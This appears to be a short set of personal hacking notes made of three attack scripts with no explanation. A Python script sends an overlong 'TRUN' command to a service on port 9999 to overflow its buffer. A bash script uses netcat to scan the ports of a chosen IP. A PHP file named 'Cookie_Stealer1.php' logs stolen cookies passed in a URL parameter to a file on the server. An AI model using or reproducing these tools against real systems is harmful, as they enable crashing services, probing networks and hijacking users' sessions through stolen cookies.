### Socket Buffer Overflow Script
```
#!/usr/bin/env python
import socket

buffer = "TRUN /.:/"
buffer += "A" * 2003
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.38.121", 9999))
print(s.recv(1024))
s.send(buffer)
print s.recv(1024)
s.close()
```
### Netcat TCP Scan (Singular IP)
```
#!/bin/bash
echo "Enter network address (e.g. 192.168.0.1): "
read net
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports
nc -nvzw1 $net $ports 2>&1 | grep -E 'succ|open'
```
## Cookie_Stealer1.php
 <?php
  2 $cookie = $_GET["username"];
  3 $steal = fopen("/var/www/html/cookiefile.txt", "a+");
  4 fwrite($steal, $cookie ."\n");
  5 fclose($steal);
  6 ?>
